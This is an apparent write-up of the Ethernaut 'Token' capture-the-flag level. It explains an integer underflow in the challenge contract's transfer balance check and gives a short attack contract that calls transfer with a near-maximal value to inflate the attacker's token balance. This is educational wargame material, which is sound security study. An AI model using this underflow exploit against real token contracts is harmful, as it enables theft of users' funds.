# Level 5: [Token](https://ethernaut.openzeppelin.com/level/0xB4802b28895ec64406e45dB504149bfE79A38A57)

## Level objectives:
1. Hack contract by increasing number of tokens owned.

## Analysis (lol)
- The transfer function checks if the msg.sender has enough money to send:
```sol
require(balances[msg.sender] - _value >= 0);
```
- In solidity ^0.6, this wraps/overflows without an error.

## Steps:
- So from a contract we send money to our address. And in the value put a massive number.
- So 0 - massive_number wraps to become something like 2^256 - 1.
```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Token {
    function transfer(address _to, uint _value) external returns (bool);
}

contract AttackToken {
    Token victim = Token(0xACf10EfA85d8e13340daDCF32C989e83Cf3274e2);

    function attack(address _to) public {
        victim.transfer(_to, 2**256-200);
    }
}
```
